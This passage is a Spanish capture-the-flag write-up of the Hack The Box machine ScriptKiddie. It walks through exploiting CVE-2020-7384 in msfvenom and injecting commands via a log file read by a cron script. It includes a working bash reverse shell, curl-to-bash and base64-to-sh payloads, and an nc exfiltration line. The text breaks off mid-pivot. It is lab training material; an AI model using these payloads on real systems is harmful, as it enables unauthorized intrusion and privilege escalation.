---
layout: single
title: ScriptKiddie - Hack The Box
excerpt: "Esta fue una máquina un poco complicada, lo que hicimos fue analizar los campos de la página web, así encontramos que podemos utilizar el Exploit CVE-2020-7384 para conectarnos de manera remota a la máquina víctima, después de enumerar lo que había dentro como el usuario Kid, analizamos 2 scripts que nos permitirán hacer pivoting para conectarnos a otro usuario llamado pwn, el cual tendrá permisos para usar la consola de Metasploit, dentro de la consola, usaremos la terminal de Ruby para convertirnos en Root."
date: 2023-05-08
classes: wide
header:
  teaser: /assets/images/htb-writeup-scriptkiddie/scriptkiddie_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Easy Machine
tags:
  - Linux
  - APK Template Command Injection
  - CVE-2020-7384
  - CRON Job
  - Command Injection
  - Pivoting
  - Msfconsole Privilege Escalation
  - OSCP Style
---
![](/assets/images/htb-writeup-scriptkiddie/scriptkiddie_logo.png)

Esta fue una máquina un poco complicada, lo que hicimos fue analizar los campos de la página web, así encontramos que podemos utilizar el Exploit **CVE-2020-7384** para conectarnos de manera remota a la máquina víctima, después de enumerar lo que había dentro como el **usuario Kid**, analizamos 2 scripts que nos permitirán hacer **pivoting** para conectarnos a otro usuario llamado **pwn**, el cual tendrá permisos para usar la consola de **Metasploit**, dentro de la consola, usaremos la terminal de **Ruby** para convertirnos en **Root**.

<br>
<hr>
<div id="Indice">
	<h1>Índice</h1>
	<ul>
		<li><a href="#Recopilacion">Recopilación de Información</a></li>
			<ul>
				<li><a href="#Ping">Traza ICMP</a></li>
				<li><a href="#Puertos">Escaneo de Puertos</a></li>
				<li><a href="#Servicios">Escaneo de Servicios</a></li>
			</ul>
		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#Web">Analizando Página Web</a></li>
				<li><a href="#Fuzz">Fuzzing</a></li>
			</ul>
		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#Exploit">Buscando y Configurando un Exploit</a></li>
				<ul>
                                	<li><a href="#PruebaExp">Probando Exploit: Metasploit Framework 6.0.11 - msfvenom APK template command injection</a></li>
                        	</ul>
				<li><a href="#Acceso">Ganando Acceso a la Máquina</a></li>
			</ul>
		<li><a href="#Post">Post Explotación</a></li>
			<ul>
				<li><a href="#Maquina">Enumeración Usuario Kid</a></li>
				<li><a href="#Movida">Probando Filtrado para Escalar Privilegios</a></li>
				<li><a href="#Payload">Probando Payload - Command Injection</a></li>
				<li><a href="#pwn">Convirtiendonos en Usuario pwn (Pivoting)</a></li>
				<li><a href="#Root">Escalando Privilegios para ser Root</a></li>
			</ul>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="Ping">Traza ICMP</h2>
Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```
ping -c 4 10.10.10.226
PING 10.10.10.226 (10.10.10.226) 56(84) bytes of data.
64 bytes from 10.10.10.226: icmp_seq=1 ttl=63 time=131 ms
64 bytes from 10.10.10.226: icmp_seq=2 ttl=63 time=131 ms
64 bytes from 10.10.10.226: icmp_seq=3 ttl=63 time=132 ms
64 bytes from 10.10.10.226: icmp_seq=4 ttl=63 time=132 ms

--- 10.10.10.226 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 131.075/131.562/132.170/0.417 ms
```
Por el TTL sabemos que la máquina usa Linux, hagamos los escaneos de puertos y servicios.

<h2 id="Puertos">Escaneo de Puertos</h2>
```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.226 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-08 14:27 CST
Initiating SYN Stealth Scan at 14:27
Scanning 10.10.10.226 [65535 ports]
Discovered open port 22/tcp on 10.10.10.226
Completed SYN Stealth Scan at 14:28, 26.68s elapsed (65535 total ports)
Nmap scan report for 10.10.10.226
Host is up, received user-set (0.99s latency).
Scanned at 2023-05-08 14:27:40 CST for 27s
Not shown: 51771 filtered tcp ports (no-response), 13763 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.79 seconds
           Raw packets sent: 125069 (5.503MB) | Rcvd: 13807 (552.300KB)
```
* -p-: Para indicarle un escaneo en ciertos puertos.
* --open: Para indicar que aplique el escaneo en los puertos abiertos.
* -sS: Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.
* --min-rate: Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
* -Pn: Para indicar que se omita el descubrimiento de hosts.
* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.

Mmmmm qué raro, solamente me muestra un puerto, vamos a hacer el escaneo de servicios, pero no especificaremos ningún puerto.

<h2 id="Servicios">Escaneo de Servicios</h2>
```
nmap -sC -sV 10.10.10.226 -oN targeted                  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-08 14:36 CST
Nmap scan report for 10.10.10.226
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c656bc2dfb99d627427a7b8a9d3252c (RSA)
|   256 b9a1785d3c1b25e03cef678d71d3a3ec (ECDSA)
|_  256 8bcf4182c6acef9180377cc94511e843 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-title: k1d'5 h4ck3r t00l5
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.77 seconds
```
* -sC: Para indicar un lanzamiento de scripts básicos de reconocimiento.
* -sV: Para identificar los servicios/versión que están activos en los puertos que se analicen.
* -p: Para indicar puertos específicos.
* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.

Ya nos apareció otro puerto, no sé por qué no se mostró en el escaneo de puertos, pero bueno, al parecer es una página web, vamos a analizarla.

<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="Web">Analizando Página Web</h2>
Para entrar, escribe la IP de la máquina y agrega el puerto 5000.

<p align="center">
<img src="/assets/images/htb-writeup-scriptkiddie/Captura1.png">
</p>

Mmmmm, a simple vista, no veo nada que más que los 3 campos. Usemos la herramienta **whatweb**, para saber algo que se nos esté pasando:
```
whatweb http://10.10.10.226:5000/                                                                                 
http://10.10.10.226:5000/ [200 OK] Country[RESERVED][ZZ], HTTPServer[Werkzeug/0.16.1 Python/3.8.5], IP[10.10.10.226], Python[3.8.5], Title[k1d'5 h4ck3r t00l5], Werkzeug[0.16.1]
```
Veo que, aparte de que está hecho en Python, están usando el servicio **Werkzeug**, investiguemos de que se trata:

**Werkzeug es una completa biblioteca de aplicaciones web WSGI. Comenzó como una simple colección de varias utilidades para aplicaciones WSGI y se ha convertido en una de las bibliotecas de utilidades WSGI más avanzadas.**

Vaya, es una herramienta alemana, quizá en **HackTricks** tengan algo útil sobre esta librería.

Aquí hay algo:
* https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug

De acuerdo al post, si la librería tiene activo **debug**, podemos activar una consola interactiva. Probémoslo:

<p align="center">
<img src="/assets/images/htb-writeup-scriptkiddie/Captura2.png">
</p>

No pues no, no sirvió esto. Veamos que hacen los campos que vienen en la página.

Primero tenemos a **NMAP**, hagamos una prueba:

<p align="center">
<img src="/assets/images/htb-writeup-scriptkiddie/Captura3.png">
</p>

No creo que nos sirva de mucho, veamos qué opciones nos da **Payloads**:

<p align="center">
<img src="/assets/images/htb-writeup-scriptkiddie/Captura4.png">
</p>

Que se me hace que por aquí va la cosa, veamos el último campo **Sploits**, busquemos algo random:

<p align="center">
<img src="/assets/images/htb-writeup-scriptkiddie/Captura5.png">
</p>

Ahora estoy casi seguro de que la movida es por el campo **Payloads**, pero por si las dudas, hagamos un **Fuzzig**.

<h2 id="Fuzz">Fuzzing</h2>
```
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.226:5000/FUZZ/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.226:5000/FUZZ/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                               
=====================================================================

000000001:   200        66 L     177 W      2135 Ch     "# directory-list-2.3-medium.txt"                                     
000000003:   200        66 L     177 W      2135 Ch     "# Copyright 2007 James Fisher"                                       
000000007:   200        66 L     177 W      2135 Ch     "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"     
000000014:   308        3 L      24 W       257 Ch      "http://10.10.10.226:5000//"                                          
000000011:   200        66 L     177 W      2135 Ch     "# Priority ordered case sensative list, where entries were found"    
000000010:   200        66 L     177 W      2135 Ch     "#"                                                                   
000000012:   200        66 L     177 W      2135 Ch     "# on atleast 2 different hosts"                                      
000000009:   200        66 L     177 W      2135 Ch     "# Suite 300, San Francisco, California, 94105, USA."                 
000000013:   200        66 L     177 W      2135 Ch     "#"                                                                   
000000006:   200        66 L     177 W      2135 Ch     "# Attribution-Share Alike 3.0 License. To view a copy of this"       
000000008:   200        66 L     177 W      2135 Ch     "# or send a letter to Creative Commons, 171 Second Street,"          
000000005:   200        66 L     177 W      2135 Ch     "# This work is licensed under the Creative Commons"                  
000000002:   200        66 L     177 W      2135 Ch     "#"                                                                   
000000004:   200        66 L     177 W      2135 Ch     "#"                                                                   
000045240:   308        3 L      24 W       257 Ch      "http://10.10.10.226:5000//"                                          

Total time: 1400.216
Processed Requests: 220560
Filtered Requests: 220545
Requests/sec.: 157.5185
```
* -c: Para que se muestren los resultados con colores.
* –hc: Para que no muestre el código de estado 404, hc = hide code.
* -t: Para usar una cantidad específica de hilos.
* -w: Para usar un diccionario de wordlist.
* Diccionario que usamos: dirbuster.
* -L: Para ocultar el resultado 302.

Tampoco nos muestra nada, entonces, todo apunta a que debemos buscar la manera de ganar acceso con el campo **Payloads**.


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="Exploit">Buscando y Configurando un Exploit</h2>

Lo que vamos a buscar, será la herramienta **Msfvenom**, que es la que está operando en el campo **Payloads** de la página web:
```
searchsploit msfvenom                   
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
Metasploit Framework 6.0.11 - msfvenom APK template command injection                                | multiple/local/49491.py
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
No estoy seguro de que sea esa versión la que está usando la máquina, pero no perdemos nada con intentarlo.

<h3 id="PruebaExp">Probando Exploit: Metasploit Framework 6.0.11 - msfvenom APK template command injection</h3>

```
searchsploit -m multiple/local/49491.py 
  Exploit: Metasploit Framework 6.0.11 - msfvenom APK template command injection
      URL: https://www.exploit-db.com/exploits/49491
     Path: /usr/share/exploitdb/exploits/multiple/local/49491.py
    Codes: CVE-2020-7384
 Verified: False
File Type: Python script, ASCII text executable
```

Analicemos este Exploit.

Por lo que entiendo, el Exploit va a generar una APK maliciosa, que ejecutara un comando que nosotros pongamos. Esta APK, se guardará en un archivo temporal, dentro de nuestra máquina, por lo que deberemos darle permisos a nuestro usuario principal, para que la podamos cargar a la página web.

Hagamos una prueba, ya sabes, por pasos:

* Vamos a cambiar el script, pidiendo que nos mande una traza ICMP, para saber si podemos usar otros comandos:
```
payload = ping -c 4 Tu_IP
```
* Genera la APK:
```
python Msfvenom_Exploit.py                           
[+] Manufacturing evil apkfile
Payload: ping -c 4 Tu_IP
-dname: CN='|echo cGluZyAtYyA0IDEwLjEwLjE0LjE2 | base64 -d | sh #
  adding: empty (stored 0%)
Generando par de claves RSA de 2,048 bits para certificado autofirmado (SHA256withRSA) con una validez de 90 días
        para: CN="'|echo cGluZyAtYyA0IDEwLjEwLjE0LjE2 | base64 -d | sh #"
jar signed.
Warning: 
The signer's certificate is self-signed.
The SHA1 algorithm specified for the -digestalg option is considered a security risk and is disabled.
The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk and is disabled.
POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.
[+] Done! apkfile is at /tmp/tmpjjynuoof/evil.apk
Do: msfvenom -x /tmp/tmpjjynuoof/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null
```
* Para poder subir el archivo, démosle permisos a nuestro usuario principal:
```
chown usuario:usuario -R /tmp/tmpjjynuoof
```
* Antes de cargar la APK, abre un servidor que obtenga la traza ICMP con la herramienta **tcpdump**:
```
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```
* Carga la APK a la página web:

<p align="center">
<img src="/assets/images/htb-writeup-scriptkiddie/Captura6.png">
</p>

En la IP, usaremos la del proxy por como está configurada la página web, aunque creo que funciona igual con la misma IP, pero mejor vayamos a lo seguro.

* Resultado
```
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
18:58:06.449418 IP 10.10.10.226 > ****: ICMP echo request, id 1, seq 1, length 64
18:58:06.449429 IP **** > 10.10.10.226: ICMP echo reply, id 1, seq 1, length 64
18:58:07.449374 IP 10.10.10.226 > ****: ICMP echo request, id 1, seq 2, length 64
18:58:07.449384 IP **** > 10.10.10.226: ICMP echo reply, id 1, seq 2, length 64
18:58:08.449024 IP 10.10.10.226 > ****: ICMP echo request, id 1, seq 3, length 64
18:58:08.449034 IP **** > 10.10.10.226: ICMP echo reply, id 1, seq 3, length 64
18:58:09.448525 IP 10.10.10.226 > ****: ICMP echo request, id 1, seq 4, length 64
18:58:09.448535 IP **** > 10.10.10.226: ICMP echo reply, id 1, seq 4, length 64
^C
8 packets captured
8 packets received by filter
0 packets dropped by kernel
```
¡Excelente! Podemos usar este Exploit para ganar acceso.

<h2 id="Acceso">Ganando Acceso a la Máquina</h2>

Hice varias pruebas que resultaron fallidas, por lo que vamos a usar una forma que ni yo conocía, usaremos una página web para obtener una terminal **Bash**. Vamos por pasos:

* Vamos a cambiar el script, pon la siguiente línea:
```
payload = 'curl Tu_IP | bash'
```
* Vamos a crear un archivo en HTML con una instrucción en Bash, para conectarnos a la máquina:
```
nano index.html
#!/bin/bash
bash -i >& /dev/tcp/Tu_IP/443 0>&1
```
* Abre un servidor en Python, en donde tengas el archivo **index.html**:
```
python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
* Genera la APK y dale los permisos a tu usuario principal:
```
python3 Msfvenom_Exploit.py                        
[+] Manufacturing evil apkfile
Payload: curl Tu_IP | bash
-dname: CN='|echo Y3VybCAxMC4xMC4xNC4xNiB8IGJhc2g= | base64 -d | sh #
  adding: empty (stored 0%)
Generando par de claves RSA de 2,048 bits para certificado autofirmado (SHA256withRSA) con una validez de 90 días
        para: CN="'|echo Y3VybCAxMC4xMC4xNC4xNiB8IGJhc2g= | base64 -d | sh #"
jar signed.
Warning: 
The signer's certificate is self-signed.
The SHA1 algorithm specified for the -digestalg option is considered a security risk and is disabled.
The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk and is disabled.
POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.
[+] Done! apkfile is at /tmp/tmpp003jckm/evil.apk
Do: msfvenom -x /tmp/tmpp003jckm/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null
chown usuario:usuario -R /tmp/tmpp003jckm
```
* Abre una netcat con el puerto que pusiste en el archivo index.html:
```
nc -nvlp 443
listening on [any] 443 ...
```
* Carga el archivo a la página:

<p align="center">
<img src="/assets/images/htb-writeup-scriptkiddie/Captura6.png">
</p>

* Resultado:
```
nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.226] 48542
bash: cannot set terminal process group (894): Inappropriate ioctl for device
bash: no job control in this shell
kid@scriptkiddie:~/html$ whoami
whoami
kid
kid@scriptkiddie:~/html$
```
* Ya solo busca la flag:
```
kid@scriptkiddie:~/html$ cd /home
cd /home
kid@scriptkiddie:/home$ ls
ls
kid
pwn
kid@scriptkiddie:/home$ cd kid  
cd kid
kid@scriptkiddie:~$ ls
ls
html
logs
snap
user.txt
kid@scriptkiddie:~$ cat user.txt
cat user.txt
```
Ahora, veamos como obtener acceso como Root.


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Post" style="text-align:center;">Post Explotación</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>

Esto va a estar un poco complicado de entender, pues lo que haremos será **Pivoting**. Pero primero, analicemos que hay dentro del usuario **Kid**.

<h2 id="Maquina">Enumeración Usuario Kid</h2>

**IMPORTANTE**

Para continuar, es necesario que obtengas una shell interactiva, puedes checar en mi blog la publicación **Notas Pentesting**, ahí te explico como hacerlo.

Una vez que ya tengas la shell interactiva, continuemos.

Veamos qué privilegios tenemos:
```
kid@scriptkiddie:~$ whoami
kid
kid@scriptkiddie:~$ id
uid=1000(kid) gid=1000(kid) groups=1000(kid)
kid@scriptkiddie:~$ sudo -l
[sudo] password for kid: 
kid@scriptkiddie:~$
```
Ninguno, veamos qué cosillas hay por aquí:
```
kid@scriptkiddie:~$ ls -la
total 60
drwxr-xr-x 11 kid  kid  4096 Feb  3  2021 .
drwxr-xr-x  4 root root 4096 Feb  3  2021 ..
lrwxrwxrwx  1 root kid     9 Jan  5  2021 .bash_history -> /dev/null
-rw-r--r--  1 kid  kid   220 Feb 25  2020 .bash_logout
-rw-r--r--  1 kid  kid  3771 Feb 25  2020 .bashrc
drwxrwxr-x  3 kid  kid  4096 Feb  3  2021 .bundle
drwx------  2 kid  kid  4096 Feb  3  2021 .cache
drwx------  4 kid  kid  4096 Feb  3  2021 .gnupg
drwxrwxr-x  3 kid  kid  4096 Feb  3  2021 .local
drwxr-xr-x  9 kid  kid  4096 Feb  3  2021 .msf4
-rw-r--r--  1 kid  kid   807 Feb 25  2020 .profile
drwx------  2 kid  kid  4096 Feb 10  2021 .ssh
-rw-r--r--  1 kid  kid     0 Jan  5  2021 .sudo_as_admin_successful
drwxrwxr-x  5 kid  kid  4096 Feb  3  2021 html
drwxrwxrwx  2 kid  kid  4096 Feb  3  2021 logs
drwxr-xr-x  3 kid  kid  4096 Feb  3  2021 snap
-r--------  1 kid  kid    33 May  8 20:23 user.tx
```
Me llama la atención ese directorio de **html** y el de **logs**, veámoslos:
```
kid@scriptkiddie:~$ cd html/
kid@scriptkiddie:~/html$ ls -la
total 28
drwxrwxr-x  5 kid kid 4096 Feb  3  2021 .
drwxr-xr-x 11 kid kid 4096 Feb  3  2021 ..
drwxrwxr-x  2 kid kid 4096 Feb  3  2021 __pycache__
-rw-rw-r--  1 kid kid 4408 Feb  3  2021 app.py
drwxrwxr-x  3 kid kid 4096 Feb  3  2021 static
drwxrwxr-x  2 kid kid 4096 Feb  3  2021 templates
```
Hay un archivo en Python y creo que es la página web, veamos:
```
kid@scriptkiddie:~/html$ cat app.py 
import datetime
import os
import random
import re
import subprocess
import tempfile
import time
from flask import Flask, render_template, request
from hashlib import md5
from werkzeug.utils import secure_filename


regex_ip = re.compile(r'^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$')
regex_alphanum = re.compile(r'^[A-Za-z0-9 \.]+$')
OS_2_EXT = {'windows': 'exe', 'linux': 'elf', 'android': 'apk'}

app = Flask(__name__)
...
```
Si es la página web, analicemos un poco el script.

Hay dos funciones que me parecen interesantes:
* La primera es la función **scan**:
```
def scan(ip):
    if regex_ip.match(ip):
        if not ip == request.remote_addr and ip.startswith('10.10.1') and not ip.startswith('10.10.10.'):
            stime = random.randint(200,400)/100
            time.sleep(stime)
            result = f"""Starting Nmap 7.80 ( https://nmap.org ) at {datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M")} UTC\nNote: Host seems down. If it is really up, but blocking our ping probes, try -Pn\nNmap done: 1 IP address (0 hosts up) scanned in {stime} seconds""".encode()
        else:
            result = subprocess.check_output(['nmap', '--top-ports', '100', ip])
        return render_template('index.html', scan=result.decode('UTF-8', 'ignore'))
    return render_template('index.html', scanerror="invalid ip")
```
Este es el escaneo que se hace en el campo **NMAP** de la página web, lo que me interesa es esto:
```
{datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M")}
```
Lo curioso, es por qué razón pide la fecha para poder hacer el escaneo, no lo había visto antes y quizá nos sirva más adelante.
* La segunda es la función **searchsploit**:
```
def searchsploit(text, srcip):
    if regex_alphanum.match(text):
        result = subprocess.check_output(['searchsploit', '--color', text])
        return render_template('index.html', searchsploit=result.decode('UTF-8', 'ignore'))
    else:
        with open('/home/kid/logs/hackers', 'a') as f:
            f.write(f'[{datetime.datetime.now()}] {srcip}\n')
        return render_template('index.html', sserror="stop hacking me - well hack you back")
```
Si te das cuenta, utiliza lo mismo que la función **scan** sobre la fecha:
```
f.write(f'[{datetime.datetime.now()}] {srcip}\n')
```
Y al parecer, abre un archivo llamado **hackers** en el directorio **logs**, creo que por ahí va la cosa para escalar privilegios.

Entiendo que el archivo **hackers**, va a guardar la fecha que se obtenga con el comando **datetime** para usarse después y se obtiene la IP con la función **srcip** de **sourceip**. No se para que se ocupe, vamos a revisar ese archivo.

Ahora vayamos con el directorio **logs**. Lo único que hay, es el archivo **hackers**, pero no contiene nada:
```
kid@scriptkiddie:~$ cd logs/
kid@scriptkiddie:~/logs$ ls -la
total 8
drwxrwxrwx  2 kid kid 4096 Feb  3  2021 .
drwxr-xr-x 11 kid kid 4096 Feb  3  2021 ..
-rw-rw-r--  1 kid pwn    0 Feb  3  2021 hackers
kid@scriptkiddie:~/logs$ cat hackers 
kid@scriptkiddie:~/logs$
```
Esto es raro. Sigamos investigando.
<br>

Hay otro usuario llamado **pwn**, veamos si podemos ver su contenido:
```
kid@scriptkiddie:/home$ ls
kid  pwn
kid@scriptkiddie:/home$ cd pwn/
kid@scriptkiddie:/home/pwn$ ls -la
total 44
drwxr-xr-x 6 pwn  pwn  4096 Feb  3  2021 .
drwxr-xr-x 4 root root 4096 Feb  3  2021 ..
lrwxrwxrwx 1 root root    9 Feb  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 pwn  pwn   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 pwn  pwn  3771 Feb 25  2020 .bashrc
drwx------ 2 pwn  pwn  4096 Jan 28  2021 .cache
drwxrwxr-x 3 pwn  pwn  4096 Jan 28  2021 .local
-rw-r--r-- 1 pwn  pwn   807 Feb 25  2020 .profile
-rw-rw-r-- 1 pwn  pwn    74 Jan 28  2021 .selected_editor
drwx------ 2 pwn  pwn  4096 Feb 10  2021 .ssh
drwxrw---- 2 pwn  pwn  4096 Feb  3  2021 recon
-rwxrwxr-- 1 pwn  pwn   250 Jan 28  2021 scanlosers.sh
kid@scriptkiddie:/home/pwn$
```
Vamos a ver ese script **scanlosers.sh**:
```
kid@scriptkiddie:/home/pwn$ cat scanlosers.sh 
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
kid@scriptkiddie:/home/pwn$
```
Aquí está la movida.

Al parecer, se utiliza el archivo **hackers** y con el comando **cut**, se está cortando la fecha y se lee la IP solamente, es así como utilizan **NMAP** para hacer los escaneos.

El problema es el filtrado, hagamos una prueba para que entendamos el problema del filtrado.


<h2 id="Movida">Probando Filtrado para Escalar Privilegios</h2>

Vamos a ver como funciona el filtrado y como nos vamos a aprovechar de esto, obvio, por pasos:
* Utiliza la consola de Python en tu máquina para imprimir la fecha actual:
```
python3                  
Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import datetime
>>> f'[{datetime.datetime.now()}]'
'[2023-05-08 23:10:46.713999]'
```
* Copia el output, úsalo junto con el comando **echo**, agrégale tu IP y utiliza el filtrado:
```
echo "[2023-05-08 23:10:46.713999] Tu_IP" | cut -d' ' -f3- | sort -u
10.10.**.**
```
Vemos que se obtuvo solamente la IP, cortando la fecha. Ahora checa esto.
* Agrega el comando **whoami**, después de la IP:
```
echo "[2023-05-08 23:10:46.713999] Tu_IP; whoami" | cut -d' ' -f3- | sort -u
10.10.**.**; whoami
```
No hay error, es decir, que se ejecutara sin problemas, lo que nos ayuda es el filtrado del **cut**, siendo él **-f3-** el que está haciendo el script vulnerable. Así que vamos a inyectar comandos dentro del script del usuario **pwn**.

Esta inyección ocurre aquí:
```
sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
```
Para ser más específicos, se colaría aquí:
```
nmap --top-ports 10 -oN recon/Tu_IP; whoami.nmap ${ip} 2>&1 >/dev/null
```
Obviamente, esto nos dará un error, por lo que hay que agregar el símbolo **#**, para que el siguiente comando esté comentado y se ejecute el que inyectamos, quedando así el Payload que vamos a utilizar:
```
"[2023-05-08 23:10:46.713999] Tu_IP o Maquina_IP; whoami #".
```
Excelente, ahora vamos a probar el Payload, utilizando el archivo **hackers** para inyectar algunos comandos.

<h2 id="Payload">Probando Payload - Command Injection</h2>

Hagamos un par de pruebas para saber si esto funcionara:
* **Primer prueba**: Veamos que pasa si inyectamos el comando **whoami**. Para hacerlo, vamos a la carpeta en donde se encuentra este archivo y vamos a meter el Payload con el comando **echo**:
```
kid@scriptkiddie:~/logs$ echo "[2023-05-08 23:10:46.713999] 10.10.10.226; whoami #" > hackers
```
Mmmmm, pues no se mostró nada. Vamos a mandar el output hacia nuestra máquina a través de netcat, abre una netcat y agrega lo siguiente al Payload:
```
echo "[2023-05-08 23:10:46.713999] 10.10.10.226; whoami | nc 10.10.14.16 443 #" > hackers
```
Ve el resultado en tu máquina:
```
nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.226] 48558
pwn
```
Muy bien, hagamos otra prueba.

* **Segunda prueba**: Vamos a lanzar una traza ICMP hacia nuestra máquina usando este método, obviamente, debes alzar un capturador con la herramienta **tcpdump**:
```
kid@scriptkiddie:~/logs$ echo "[2023-05-08 23:10:46.713999] 10.10.10.226; ping -c 4 Tu_IP #" > hackers
[2023-05-08 23:10:46.713999] 10.10.10.226
PING 10.10.14.16 (10.10.14.16) 56(84) bytes of data.
64 bytes from 10.10.14.16: icmp_seq=1 ttl=63 time=130 ms
64 bytes from 10.10.14.16: icmp_seq=2 ttl=63 time=130 ms
64 bytes from 10.10.14.16: icmp_seq=3 ttl=63 time=131 ms
64 bytes from 10.10.14.16: icmp_seq=4 ttl=63 time=132 ms
--- 10.10.14.16 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004m
```
Si observas el **tcpdump**, verás que se recibieron, pero ¿qué pasara si tratamos de cambiar los permisos de la Bash? Intentémoslo:
```
kid@scriptkiddie:~/logs$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
kid@scriptkiddie:~/logs$ echo "[2023-05-08 23:10:46.713999] 10.10.10.226; chmod u+s /bin/bash #" > hackers
kid@scriptkiddie:~/logs$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
```
No funciono, entonces lo que haremos será convertirnos en el usuario **pwn** y lo haremos de la misma forma con la que obtuvimos acceso la primera vez.

<h2 id="pwn">Convirtiendonos en Usuario pwn (Pivoting)</h2>

Vamos por pasos:
* Utilizaremos el mismo archivo index.html, entonces abre un servidor en Python en donde este ese archivo:
```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
